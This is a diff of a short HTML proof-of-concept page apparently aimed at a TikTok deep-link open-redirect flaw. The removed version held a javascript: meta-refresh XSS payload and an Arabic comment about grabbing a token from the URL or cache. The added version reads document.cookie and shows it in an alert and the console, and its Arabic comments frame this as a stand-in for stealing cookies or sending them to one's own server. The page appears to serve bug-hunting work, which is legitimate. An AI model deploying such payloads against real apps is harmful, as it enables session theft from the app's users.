@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=javascript:alert('XSS_Success_Domain_'+document.domain)">
+    <title>PoC Security Test</title>
 </head>
-<body>
-    <h1>Loading Secure Session...</h1>
+<body style="text-align: center; padding-top: 50px;">
+    <h1>TikTok Deep Link Vulnerability PoC</h1>
+    <p style="color: red;">If you see this page inside the TikTok app, the Open Redirect is confirmed.</p>
+    
     <script>
-        // محاولة سحب التوكن من الرابط أو الكاش
-        console.log(window.location.href);
+        // بدلاً من سرقة الكوكيز، سنقوم فقط بإظهارها في تنبيه لإثبات القدرة على الوصول
+        // ملاحظة: تيك توك غالباً ما تستخدم HttpOnly cookies، لذا قد لا تظهر كل البيانات
+        alert("Success! Accessing Cookie Context: " + document.cookie);
+        
+        // لإرسال البيانات لسيرفرك (لأغراض الإثبات فقط)
+        console.log("PoC Executed. Cookies: ", document.cookie);
     </script>
 </body>
 </html>
